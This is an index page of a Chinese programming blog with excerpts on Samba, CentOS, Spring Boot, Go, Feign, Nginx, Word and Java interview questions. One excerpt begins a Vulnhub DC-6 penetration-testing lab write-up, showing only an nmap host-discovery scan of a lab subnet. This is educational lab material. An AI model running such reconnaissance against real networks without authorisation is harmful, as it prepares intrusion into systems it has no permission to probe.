<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a62163b71475c22e11c1f32041faea3/" rel="bookmark">
			从零学习Linux操作系统 第二十一部分 网络文件系统的参数使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、samba简介 实验环境 需要两台主机
一台为服务器 另一台为客户端
Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。
smb = Server Message Block ##Miscrosoft
cifs = Common Internet File System ##SUN
windows系统共享文件时用到的协议smb
smb是由miscrosoft+sun
Linux 用到的是 cifs
二、网络文件系统对于企业的意义 为项目服务的主机不能只有一台，若只有一台主机信息量太大容易崩溃，所以一个项目必须有很多太主机为之服务。但很多太主机就容易管理不当造成其中的主机失控宕机，其他的主机并不能对此主机进行访问，会造成此主机内的信息丢失。为了避免此情况的发生，使整套主机系统更加稳定，则需要为此套系统、主机群设定一个存储、一个公用的存储，所有主机通过网络连接这个存储。若一台主机出现了问题，其他的主机也可以通过网络访问到这台主机的信息，这样所有主机的信息都不会丢失。这就是存储分离。
三、samba的安装启用及samba用户管理 （一）saba的基本信息 服务启动脚本： smb.service
主配置目录： /etc/samba
主配置文件： /etc/smb.conf
安全上下文： samba_share_t
端口：139、445
安装包： samba
samba-common
（二）samba的安装与启用 samba的安装：
dnf install samba samba-common samba-client -y
samba服务启动：
systemctl enable --now smb
samba服务启用
firewall-cmd --permanent --add-service=samba
firewall-cmd --reload
测试
smbclient -L //192.168.0.41
（三）samba用户的建立 samba用户必须是被地存在的用户
samba用户的建立
smbpasswd -a 用户名添加用户pdbedit -L查看用户列表pdbedit -x 用户名删除用户 重新设置一个配置文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a62163b71475c22e11c1f32041faea3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2608f27402232753796c01a889c9539/" rel="bookmark">
			vmware安装centos8-stream
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 VMware与CentOS8-stream的配置教程【2022-9-5】_centos stream 8-CSDN博客
启动进入后配置网络，/etc/sysconfig/network-scripts/网卡
vmware上的centos8没有网络_主机时wifi上网,centos 8 安装后无法连接网络 解决办法-CSDN博客
centos8配置网络_centos8网络配置-CSDN博客
https://libin9ioak.blog.csdn.net/article/details/116450326?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116450326-blog-109453172.235%5Ev43%5Epc_blog_bottom_relevance_base6&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116450326-blog-109453172.235%5Ev43%5Epc_blog_bottom_relevance_base6&amp;utm_relevant_index=2
yum配置
centos-8-AppStream-x86_64-os安装包下载_开源镜像站-阿里云
https://mirrors.aliyun.com/centos/8/BaseOS/x86_64/os/ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5906d81bcac1b16220cdc9b4aeea9cb1/" rel="bookmark">
			Vulnhub-dc6
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		信息收集 # nmap -sn 192.168.1.0/24 -oN live.port Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 14:39 CST Nmap scan report for 192.168.1.1 Host is up (0.00075s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 192.168.1.2 Host is up (0.00022s latency). MAC Address: 00:50:56:FE:B1:6F (VMware) Nmap scan report for 192.168.1.95 Host is up (0.00013s latency). MAC Address: 00:0C:29:D7:4A:3C (VMware) Nmap scan report for 192.168.1.254 Host is up (0.00094s latency). MAC Address: 00:50:56:F1:2C:8A (VMware) Nmap scan report for 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5906d81bcac1b16220cdc9b4aeea9cb1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3336ce7cf25c59185d9872ad687362b/" rel="bookmark">
			从日常到职业，数据分析师的魔法之旅
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		生活中那些平凡却又复杂的现象，比如为何早高峰的地铁总是拥挤，或者为什么网络购物推荐总能精准触及个人喜好？这些看似简单的日常瞬间，实际上蕴含着丰富的数据和规律。这正是数据分析和机器学习闪耀其光芒的舞台。
在这个数据驱动的时代，掌握数据分析不仅是职业发展的利器，更是解锁日常生活之谜的钥匙。
文章目录 生活中的数据挑战生活中的机器学习应用机器学习的兴趣起点工作中的机器学习总结 生活中的数据挑战 在当今世界，生活中遭遇的各种问题，往往隐藏着未经挖掘的数据宝藏。例如，交通拥堵不仅仅是城市生活的常态，也反映了人口流动、城市规划和公共政策的交织。类似地，购物决策不仅是个人的喜好体现，也是市场趋势、消费行为和经济活力的直接指标。这些日常遭遇的问题，实际上为数据分析提供了丰富的应用场景和解决方案的挑战。
举个例子，当面对超市的林林总总商品时，选择何种产品往往会让消费者感到困惑。这不仅仅是个人偏好的问题，实际上，通过分析购物数据，可以揭示消费者习惯、季节性需求变化及促销活动的效果等信息。这些数据分析结果能够帮助零售商制定更有效的营销策略，同时也能提升消费者的购物体验。
另一方面交通拥堵这一城市普遍现象，通过数据分析，可以更深入地理解交通流量的模式、高峰时段的主要瓶颈以及可能的改善措施。例如，通过分析不同时间段的交通数据，城市规划者可以优化交通灯配时，减少交通拥堵，提升城市交通效率。
因此日常生活中遇到的问题实际上是理解和应用数据分析的绝佳起点。通过挖掘这些问题背后的数据，不仅可以提供切实可行的解决方案，还能深化对日常生活规律的理解，显示出数据分析在现代社会的重要性和应用价值。
生活中的机器学习应用 在当今社会，机器学习已悄然融入日常生活的方方面面。想象一下，清晨起床时手机的智能闹钟根据睡眠模式进行了微调，为起床提供了最佳时机。然后，智能音箱播放的新闻内容，恰好是对个人兴趣偏好的精准推荐。出门前，智能家居系统已根据天气预报和个人日程调整室内温度。这一切看似寻常，背后却是机器学习技术无声的支持。
在日常出行中，导航软件能够实时分析路况，推荐最佳路线，大大减少了堵车带来的困扰。此外，购物体验也因机器学习而焕然一新。线上购物平台通过分析购买历史、浏览习惯等数据，智能推荐个性化的商品，不仅提高了购物效率，也增加了发现新商品的乐趣。
机器学习在娱乐方面的应用同样引人注目。视频平台通过用户的观看历史，智能推荐可能喜欢的电影或电视节目。这种基于个人喜好的定制化服务，让娱乐体验更加个性化、多元化。
在健康管理方面，智能手表和健康追踪器通过收集心率、步数等数据，帮助监测身体状况，并提供运动和健康建议。这不仅让人们更加关注健康，也使得日常的健康管理变得更加科学和高效。
这些例子仅是冰山一角，机器学习技术已深入到生活的许多领域，从而极大地提升了生活质量和效率。它让日常生活变得更加智能和便捷，同时也展现了技术发展的巨大潜力。而这一切，都是基于对海量数据的分析和学习，展示了数据分析在现代生活中的关键作用。
机器学习的兴趣起点 探寻机器学习的魅力，往往源于日常生活中最不起眼的瞬间。设想一个平凡的周末，坐在咖啡馆里，旁边的顾客正在使用智能手机。或许他们正通过一款流行的音乐推荐应用挑选歌曲，这背后便是机器学习技术的精妙应用。应用程序分析用户过往的听歌习惯、评分和搜索历史，从而精准推荐合适的歌曲。这种个性化体验让人不禁思考，这些技术是如何学习和适应每个独特用户的偏好的？
同样在线购物平台的推荐系统也是机器学习技术的生动展示。系统不仅分析购物历史，还考虑浏览习惯、购物车内容和用户评价，以此预测并推荐用户可能感兴趣的商品。这些看似简单的功能，实际上是大数据和机器学习算法结合的成果，它们正逐渐成为日常生活中不可或缺的一部分。
进一步思考，智能家居系统中的语音助手更是机器学习应用的典范。通过语音识别和自然语言处理技术，这些助手能理解并执行语音命令，从播放音乐到设置闹钟，乃至控制家庭设备。这些交互的背后，是复杂的算法不断学习用户的语言习惯和指令偏好，以提供更加个性化的服务。
这些日常生活中的例子，不仅让人对机器学习的能力和潜力产生兴趣，而且也启发了对背后技术的好奇。从简单的推荐系统到复杂的语音助手，机器学习正以其无处不在的存在，逐渐改变着生活的方方面面。正是这种潜在的变革力量，促使越来越多的人向往成为能够驾驭这股力量的数据分析师。通过学习和掌握这些技术，便能在职业生涯中发挥重要作用，不仅解决实际问题，还有可能引领未来的技术潮流。
工作中的机器学习 在职场中，机器学习不再是一个遥远的概念，而是成为推动各行各业进步的关键力量。从营销策略的制定到金融风险的评估，再到医疗诊断的辅助，机器学习的应用无处不在。例如，市场分析师利用机器学习模型分析消费者行为，预测市场趋势，从而制定更有效的营销策略。在金融领域，通过机器学习算法，可以对大量的交易数据进行分析，有效预测和管理风险，提高决策的准确性。
机器学习的崛起，也为个人职业发展带来了新的机遇。掌握数据分析和机器学习技能，不仅能够增强个人的竞争力，还能够在工作中发挥重要作用，提升效率和效果。面对海量的数据，通过机器学习技术的应用，能够快速找出有效信息，辅助决策，提高工作效率。同时，这也促使个人不断学习新技能，保持与时俱进。
在未来的职场中，机器学习的重要性只会越来越明显。无论是在提高工作效率、辅助决策还是创造新的业务机会方面，机器学习都扮演着越发重要的角色。因此，对于那些希望成为顶尖数据分析师的人来说，现在是最佳时机，通过学习和实践，掌握这一领域的关键技能，为未来的职业生涯铺平道路。
总结 穿梭于生活和工作的每一刻，数据分析和机器学习如同隐形的线索，串联起看似杂乱无章的信息。从日常生活中的简单好奇到职业技能的精进，数据分析的力量无处不在。
成为一名顶尖的数据分析师不仅意味着掌握处理数据的能力，更是能够洞察生活、引领变革的关键。在这个由数据驱动的世界，拥抱数据分析，就是拥抱未来无限的可能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1302732a127385832f142f32703f0cf5/" rel="bookmark">
			解决Could not create connection to database server异常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在做springboot检查数据库是否连接成功是出现该异常，这个很明显是sql链接异常，我检查了用户名和密码并没有发现端倪，最后将applicarion.yml文件中shanghai改为Shanghai解决问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9a22f19f5c6c3135544077f8c142d12/" rel="bookmark">
			77.Go中interface{}判nil的正确姿势
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一：interface{}简介二、interface{}判空三：注意点四：实际案例 一：interface{}简介 在go中的nil只能赋值给指针、channel、func、interface、map或slice类型的变量
interface 是否根据是否包含有 method，底层实现上用两种 struct 来表示：iface 和 eface。
eface：表示不含 method 的 interface 结构，或者叫 empty interface。对于 Golang 中的大部分数据类型都可以抽象出来 _type 结构，同时针对不同的类型还会有一些其他信息。
iface： 表示 non-empty interface 的底层实现。相比于 empty interface，non-empty 要包含一些 method。method 的具体实现存放在 itab.fun 变量里。
定义在 src/runtime/runtime2.go 中
type iface struct { tab *itab data unsafe.Pointer } type eface struct { _type *_type data unsafe.Pointer } 上述就是两种 interface 的定义。然后我们再看 iface中的 itab 结构：(被定义在 src/runtime/runtime2.go 中)
type itab struct { inter *interfacetype	// 接口的类型 _type *_type	//	实际对象类型 // .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9a22f19f5c6c3135544077f8c142d12/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25f6edd720c21392df38dfd94faf0c9c/" rel="bookmark">
			SpringBoot系列之JPA实现按年月日查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在实际的软件开发中，经常需要按照日期进行数据查询和分析。例如，在一个电子商务平台中，你可能需要统计每天的销售额；在一个社交媒体应用中，你可能需要按照用户的注册日期进行分析。Spring Boot 是一个流行的 Java 开发框架，它简化了基于 Spring 的应用程序的开发，并提供了许多便捷的功能。而 JPA（Java Persistence API）则是 Java 平台上的一个 ORM（对象关系映射）规范，它提供了一种简单的方式来管理数据库的持久化对象。
在本文中，我们将探讨如何使用 Spring Boot 和 JPA 实现按年月日查询的功能。我们将创建一个简单的示例应用程序，演示如何在其中使用 JPA 进行基于日期的查询操作。
准备工作 首先，确保你已经安装了 Java 开发环境和 Maven 或 Gradle 构建工具。然后，创建一个新的 Spring Boot 项目。你可以使用 Spring Initializr（https://start.spring.io/）来生成项目模板。在添加依赖时，确保选择 Spring Web 和 Spring Data JPA。
创建实体类 在我们的示例中，假设我们有一个简单的实体类表示某种交易记录。在这个示例中，我们将关注日期属性。
import javax.persistence.*; import java.util.Date; @Entity @Table(name = "transactions") public class Transaction { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; @Temporal(TemporalType.DATE) private Date transactionDate; private double amount; // Getters and setters } 编写 Repository 接口 接下来，我们需要编写一个 Repository 接口来处理对数据库的操作。Spring Data JPA 提供了许多内置的方法，我们可以通过命名约定来定义自定义的查询方法。```java
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25f6edd720c21392df38dfd94faf0c9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a50126f2a40820f0cbb25e416d90b653/" rel="bookmark">
			基于Java Web的微信公交小程序(分web端&#43;微信小程序端)、功能完整、下载即可以运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		年底了公司的事情特别多，基本上没有更新博客信息。今天稍微空了点，陆续为为大家介绍Java web项目，今天要介绍的是一个入门级的项目、整个系统属于基础的项目，但是涉及到的知识比较多，可以直接用于课程设计或者毕业设计，通过是没有任何问题的。基于Java web的微信小程序公交系统分为两种用户类型：普通用户和系统管理员。其中普通用户通过微信来进行公交信息的查询(按线路、按站站查询),同时可以进行失物招领的查看。系统管理员负责整个系统的日常维护，具备的功能包括：新闻公告管理、管理员管理、站台管理、线路管理、途径站管理。整个系统界面漂亮，有完整得源码，可以直接用于课程设计或者毕业设计。喜欢的帮忙点赞和关注。一起编程、一起进步。
一 软件架构 开发语言为Java，开发环境Eclipse或者IDEA都可以。数据库采用：MySQL。本项目是基于MVC的JSP技术进行的Web应用程序开发，其中JSP技术为表示层，包括EL表达式、JSP动作、JSTL标准标签技术
Servlet为控制层技术
JavaBean为开发模型层
采用MVC设计模式对各个模块进行开发
数据库采用mysql数据库
采用Tomcat作为Web服务器
火狐浏览器，360浏览器，Chrome浏览器，IE浏览器做为本次程序的运行浏览器
二 系统主要功能 基于Java web的微信小程序公交系统分为两种用户类型：普通用户和系统管理员。其中普通用户通过微信来进行公交信息的查询(按线路、按站站查询),同时可以进行失物招领的查看。系统管理员负责整个系统的日常维护，具备的功能包括：新闻公告管理、管理员管理、站台管理、线路管理、途径站管理。主要系统功能如下图所示：
三 实现效果 一 管理员主要功能 1 管理员登陆 2 新闻公告管理 3 管理员管理 4 站点管理 5 线路管理 6 途径站管理 二 小程序主要功能 7 小程序线路查询 8 公交直达查询 9 公交详情查看 10 失物招领 四 项目总结 （1）在写代码之前，在大脑里一定要把思路理清楚，不能模模糊糊，一定要把功能图和流程图画出来，然后根据它去实现每一个功能块，要多分析，培养一种良好的逻辑思维能力。
（2）在写代码的过程中，一定要采取就近原则，同一个功能，或者对同一个组件的设置一般要写在一块，这样写的程序比较清晰，不容易出错，也便于查找。
（3）要养成良好的注释习惯，一是有利于别人阅读你的程序，同时也有利于自己以后再看，就能很快的读懂程序，提高效率。
（4）把功能模块化，即把实现相同功能的代码段封装成一到一个类或者一个方法中，实现的时候调用即可，这样能提高代码的可读性
（5）养成创建包来存放不同功能的类，使系统的结构更加模块化和规范化。
（6)在编写代码的时候，一定要边写边调试，要适时的设置断点，或者把某些变量的值输出到控制台，通过观察和分析变量的值，便于判断问题所在，同时，需要捕获异常的一定要把异常信息打印出来，便于分析问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e14b07b60fe5954e67d27cab3eccc10/" rel="bookmark">
			R语言【taxlist】——merge_taxa()：整合概念和移除名称
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Package taxlist version 0.2.4
Description 将分类概念合并为单个 taxlist 对象。
Usage merge_taxa(object, ...) ## S3 method for class 'taxlist' merge_taxa(object, concepts, level, print_output = FALSE, ...) Arguments 参数【object】：taxlist 对象。
参数【...】：要传递给其他方法或从其他方法传递的其他参数。
参数【concepts】：数值（整数）向量，包括要合并的分类概念。
参数【level】：字符向量，指示合并的最低级别。
参数【print_output】：指示是否应在控制台中显示合并概念的逻辑值。
Details 参数【concepts】中指示的分类概念将合并为一个概念。
新概念继承了 slots taxonRelations 和 taxonTraits 的 ID 和相应的属性，这些属性来自参数【concepts】中指示的第一个分类概念。
为方便起见，可以通过设置 print_output=TRUE 来显示生成的概念，但仅在使用参数【concepts】时显示。
此函数的另一种应用是通过参数级别实现的，其中所有较低等级的分类单元都将合并到指定的级别或更高级别（如果合并分类群的父级处于较高级别）。
Value 一个 taxlist 对象。
Examples summary(Easplist, c(206, 197)) ------------------------------ concept ID: 206 view ID: 1 level: species parent: 54853 Cyperus L. # accepted name: 206 Cyperus papyrus L.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e14b07b60fe5954e67d27cab3eccc10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7479b391c165835f350ba12d54197feb/" rel="bookmark">
			【最详细】最全java面试题及答案（210道）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文分为十九个模块，分别是：「Java 基础、容器、多线程、反射、对象拷贝、Java Web 、异常、网络、设计模式、Spring/Spring MVC、Spring Boot/Spring Cloud、Hibernate、MyBatis、RabbitMQ、Kafka、Zookeeper、MySQL、Redis、JVM」 ，
Java 基础
1. JDK 和 JRE 有什么区别？
JDK：Java Development Kit 的简称，Java 开发工具包，提供了 Java 的开发环境和运行环境。
JRE：Java Runtime Environment 的简称，Java 运行环境，为 Java 的运行提供了所需环境。
具体来说 JDK 其实包含了 JRE，同时还包含了编译 Java 源码的编译器 Javac，还包含了很多 Java 程序调试和分析的工具。简单来说：如果你需要运行 Java 程序，只需安装 JRE 就可以了，如果你需要编写 Java 程序，需要安装 JDK。
篇幅限制下面就只能给大家展示小册部分内容了。包括了：Java面试、Spring、JVM、MyBatis、Redis、MySQL、并发编程、微服务、Linux、Springboot、SpringCloud、MQ、Kafka 面试专题
需要全套资料及答案的在【翻到文章底部，点击名片】即可免费获取 备注：“CSDN”
2. == 和 equals 的区别是什么？
「== 解读」
对于基本类型和引用类型 == 的作用效果是不同的，如下所示：
基本类型：比较的是值是否相同；
引用类型：比较的是引用是否相同；
代码示例：
String x = "string";
String y = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7479b391c165835f350ba12d54197feb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d482a01c36b98054129f660e96585c88/" rel="bookmark">
			【word】论文、报告：①插入图表题注，交叉引用②快速插入图表目录③删改后一键更新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【word】①插入图表题注，②删改后一键更新 写在最前面插入题注交叉引用修改插入题注的文字格式快速插入图表目录 插入题注后有删改，实现编号一键更新 🌈你好呀！我是 是Yu欸 🌌 2024每日百字篆刻时光，感谢你的陪伴与支持 ~ 🚀 欢迎一起踏上探险之旅，挖掘无限可能，共同成长！ 写在最前面 在创建报告、论文或其他文档时，经常需要插入图表，并对其进行标号、添加题注以及在文档中进行引用。同时，要确保在文档末尾或需要的地方能够生成图表目录，以便读者可以快速找到所需的图表。
本文将介绍如何在Microsoft Word中实现这些功能：如何针对图表插入题注、交叉引用，且后续快速插入图表目录？，确保图表管理更加高效。
参考：
知乎专栏：链接太长了，所以设置了超链接
插入题注 第一步：插入图表
首先，在文档中插入您的图表。这可以通过拖放图像文件，或使用Word中的"插入"选项卡来完成。
第二步：添加题注
选中您要为其添加题注的图表。转到Word中的"引用"选项卡。在"引用"选项卡中，您将找到"题注"组，点击"插入题注"按钮。在弹出的对话框中，选择适当的标签和位置，然后点击"确定"。您可以选择使用默认的标签（例如，“图表”），也可以自定义标签。 现在，您的图表已经有了题注。
交叉引用 第一步：插入交叉引用
当您需要在文档的其他部分引用图表时，可以使用交叉引用功能。
在文档中的目标位置，点击插入点。转到Word中的"引用"选项卡。在"引用"选项卡中，点击"插入交叉引用"按钮。在弹出的对话框中，选择"引用类型"为"图表"，“引用内容”中选择“只有标签和编号”，然后在列表中选择要引用的图表。（如果插入题注的图多，则需要选择下方的“引用哪一个题注”，选择一个）。点击"插入"按钮。 现在，您已经成功插入了交叉引用，它将显示为图表的标号，并且会自动更新，以反映图表的任何更改或重新排序。
修改插入题注的文字格式 图下面的图题文字格式需要变化时，不可能每次都修改一次。可以右击“开始”选项卡下的“样式”中的“题注”，点击“修改”。
进入修改界面后，根据论文对图题的相应要求，修改“字体”、“段落”的相应格式，然后点击“确定”，则全文中，每次插入题注时，都不需要再次修改图题文字格式。
快速插入图表目录 第一步：插入图表目录
要在文档末尾或所需位置插入图表目录，执行以下步骤：
转到您希望插入图表目录的位置。转到Word中的"引用"选项卡。在"引用"选项卡中，找到"目录"组，点击"插入目录"按钮。在弹出的“图表目录”选项卡中，选择想要导出目录的“题注标签”名，点击“确定”即可导入相关目录。 如果论文中的图名有所改变，可以右键该目录，选择“更新域”，（类似于“更新目录”），该图表的目录就会更新。
第二步：配置目录
在弹出的对话框中，您可以选择不同的样式和格式来自定义目录的外观。确保选择包括"图表"在内的所需项目。
第三步：插入目录
点击"确定"按钮，Word将在您选择的位置插入一个图表目录。此目录将自动更新，以反映文档中图表的任何更改或添加。
通过遵循上述步骤，您可以轻松地在Microsoft Word文档中插入图表题注、交叉引用和图表目录，从而提高文档的整体质量和可读性。这些功能将确保您的图表管理更加高效，同时为读者提供更好的导航体验。
插入题注后有删改，实现编号一键更新 当在word中使用题注给表格、图添加序号时，如果删除了一些表格或者图片，那么其后的表格和图片不会自动更新。
解决办法：
1、选中当前页的图表后，按 F9 键进行手动更新。
2、或者更干脆点，Ctrl + A 全选整篇文档，然后按 F9 全局更新（选择“更新整个目录”选项）。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e708fb0bfe81a8cbe19c86dc74306060/" rel="bookmark">
			Linux命令-arj命令（用于创建和管理.arj压缩包）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 补充说明 arj命令 是 .arj 格式的压缩文件的管理器，用于创建和管理 .arj 压缩包。
语法 arj(参数) 参数 操作指令：对 .arj 压缩包执行的操作指令压缩包名称：指定要操作的arj压缩包名称 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20ac8e988fc0f84c1c48e97bc548b0aa/" rel="bookmark">
			详解SpringCloud之远程方法调用神器Fegin
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第1章：引言 咱们作为Java程序员，在微服务领域里，Spring Cloud可谓是个耳熟能详的大名。它提供了一套完整的微服务解决方案，其中就包括了服务间的通信。在这个微服务中，有一个成员特别引人注意，它就是Feign。
那Feign到底是什么呢？简单来说，Feign是一个声明式的Web服务客户端，它让编写Web服务客户端变得更加简单。我们不用再写一堆复杂的代码来处理HTTP请求，只需要通过简单的接口和注解，就能完成服务间的调用。
在微服务架构中，服务间的通信是一个核心问题。我们之前可能用过很多方式来实现这一点，比如使用RestTemplate。但Feign的出现，让这一切变得更加优雅和简洁。它不仅提供了客户端负载均衡的能力，还能与Spring Cloud的其他组件无缝集成，比如Eureka、Ribbon和Hystrix。
第2章：Feign的基本概念和原理 要理解Feign，咱们得先知道它背后的基本原理。Feign的核心在于它是如何简化HTTP客户端编程的。传统的客户端编程往往需要处理很多繁琐的工作，比如建立连接、发送请求、处理响应等。Feign通过提供一种声明式的方法，让这些工作变得轻而易举。
在Feign中，咱们只需要定义一个接口，然后在接口上添加一些注解，比如@FeignClient。这些注解里包含了调用远程服务所需的所有信息。Feign会根据这些信息，自动构建并发送HTTP请求。是不是听起来很酷？
接下来，小黑给大家看一个简单的例子。假设咱们有一个用户服务，需要调用订单服务的API获取订单信息。使用Feign的话，咱们可以这么做：
java
复制代码
@FeignClient(name = "order-service") public interface OrderServiceClient { @RequestMapping(method = RequestMethod.GET, value = "/orders/{userId}") List&lt;Order&gt; getOrdersByUserId(@PathVariable("userId") Long userId); } 在这个例子中，OrderServiceClient是一个Feign客户端，它通过@FeignClient注解指定了服务名。方法getOrdersByUserId通过@RequestMapping注解定义了调用的HTTP路径和方法。这样，当这个接口的方法被调用时，Feign就会自动向order-service服务发送一个GET请求到/orders/{userId}路径。
但Feign的神奇之处不止于此。它还提供了客户端负载均衡的功能，这是通过集成Ribbon实现的。Feign还能与Hystrix集成，提供熔断机制，确保在某个服务发生问题时，不会影响到整个系统的稳定性。
通过这些功能，Feign极大地简化了微服务之间的通信，让服务的调用就像调用本地方法一样简单。
第3章：Feign的配置与使用 首先，要使用Feign，咱们得在Spring Cloud项目中加入Feign的依赖。小黑这里用Maven作为例子，但如果咱们用的是Gradle或其他依赖管理工具，步骤也大同小异。
xml
复制代码
&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; 加入依赖后，下一步是在Spring Boot的主类上添加@EnableFeignClients注解，这样就启用了Feign的功能。
java
复制代码
@SpringBootApplication @EnableFeignClients public class Application { public static void main(String[] args) { SpringApplication.run(Application.class, args); } } 接着，咱们来创建一个Feign客户端。假设小黑要调用一个用户服务，那么首先定义一个接口，然后在接口上使用@FeignClient注解。在这个注解中，指定了要调用的服务的名称，这个名称对应着在Eureka或其他服务发现工具中注册的服务名。
java
复制代码
@FeignClient(name = "user-service") public interface UserServiceClient { @GetMapping("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20ac8e988fc0f84c1c48e97bc548b0aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/351addedd8a9775fe9467978fb4fa8e2/" rel="bookmark">
			作为一名前后端开发,应该对Nginx有怎样的认识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为一名前后端开发,应该对Nginx有怎样的认识 如果是一名前端，正常来说只需要好好写代码就行，至于部署相关的操作，我们通常接触不到，但不代表不需要了解
如果是一名后端，那么部署这个任务多半是离不开的，后端有时候什么都干！
相信大家多多少少都听说过 「Nginx」，给大家科普一下到底什么是Nginx，都能干些什么事
1.Nginx是什么 Nginx 是一个「轻量级、高性能的HTTP」和「反向代理服务器」，同时也是一个「通用代理服务器」
Nginx是一个拥有高性能HTTP和反向代理服务器，其特点是占用内存少，并发能力强，并且在现实中，nginx的并发能力要比在同类型的网页服务器中表现要好
Nginx 专为性能优化而开发，最重要的要求便是性能，且十分注重效率，有报告nginx能支持高达50000个并发连接数
2.什么是反向代理？正向代理？ 其实只需要简单的两句话就可以解释清楚，客户端指的是用户，服务端指的是项目部署的服务
正向代理：客户端不想让服务器知道客户端的ip，所以让代理服务器去访问，再返回给客户端。
反向代理：服务器不想客户端知道是哪个服务器响应的，所以让代理服务器去分配，让空闲的服务器去响应。
3.Nginx作负载均衡 大家对微服务有所了解的话，应该都大概听说过负载均衡这个概念
用于将工作负载分布到多个服务器来提高网站、应用、数据库或其他服务的性能和可靠性。
用最简单的话来说，原本老板给你一个任务你要一个人做，现在老板的这个任务派给了3个人做，这就是负载均衡
如果没有负载均衡的话，客户端的操作通常是
「客户端请求服务器，然后服务端去数据库查询数据，将返回的数据带给客户端」
但随着客户端越来越多，数据，访问量飞速增长，这种情况显然无法满足，我们从上图发现，客户端的请求和相应都是通过服务端的，那么我们加大服务端的量，让多个服务端分担，是不是可以减轻一台服务器所承担的压力了？
